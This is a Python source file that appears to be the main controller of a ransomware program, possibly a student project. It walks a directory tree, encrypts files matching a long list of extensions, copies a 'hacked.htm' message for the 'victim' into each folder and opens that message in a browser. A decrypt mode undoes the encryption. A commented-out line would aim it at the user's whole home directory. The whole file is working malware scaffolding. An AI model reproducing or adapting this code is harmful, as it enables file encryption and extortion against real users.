# from product_cipher import *
from functions import *
from shutil import copy
import os
import sys
import webbrowser
# from os.path import expanduser


# Main controller that gets input from the user and a list of files
# and sends them off to be encrypted or decrypted
def main(argv):

    # Create the key and get mode from the user
    key = createKey()
    if (len(sys.argv)) < 2:
        print("Incorrect usage")
        print("Usage: python3 main_program.py -e")
        print("Usage: python3 main_program.py -d")
        sys.exit(2)
    else:
        mode = getOption(argv)

    # Only imports module relevant to the mode
    # This means encrypt and decrypt can be separated
    if mode == 'encrypt':
        from product_cipher_encrypt import encrypt
    elif mode == 'decrypt':
        from product_cipher_decrypt import decrypt

    # Specify the root directory
    path = "target_folder/"
    # This version selects the user's home directory for the root
    # path = expanduser("~")

    # File to display message to victim
    message_to_victim = "hacked.htm"

    # List of the filetypes that are supported by the program
    ext = ('.txt', '.xhtml', '.html', '.htm', '.css', '.php', '.sql',
           '.java', '.jsp', '.js', '.xml', '.xsl', '.xsd', '.xslt', '.xlog',
           '.json', '.py', '.rtf', '.srt', '.sub', '.csv', '.conf', '.log',
           '.manifest', '.lrc', '.html5', '.linux', '.sha1', '.sha512',
           '.err', '.readme', '.man', '.encrypted')

    '''
    Search the filesystem. For each file found, check if the extension is
    on the supported list. If it is, create a full filename including
    the path and pass it to either encrypt or decrypt depending on the mode.
    If encrypting, copy the message file to each folder with encrypted files.
    If decrypting, delete the message file from those folders.
    '''
    for root, subdir, files in os.walk(path):
        check = 0
        for filename in files:
            if filename.endswith(tuple(ext)):
                filename = os.path.join(root, filename)
                if mode == 'encrypt':
                    encrypt(key, mode, filename)
                    if check == 0:
                        copy(message_to_victim, root)
                        check = 1
                elif mode == 'decrypt':
                    if filename == os.path.join(root, message_to_victim):
                        os.remove(filename)
                    else:
                        decrypt(key, mode, filename)

    # When encryption is finished, open the browser and display the message.
    if mode == 'encrypt':
        webbrowser.open(message_to_victim, new=1)


main(sys.argv[1:])
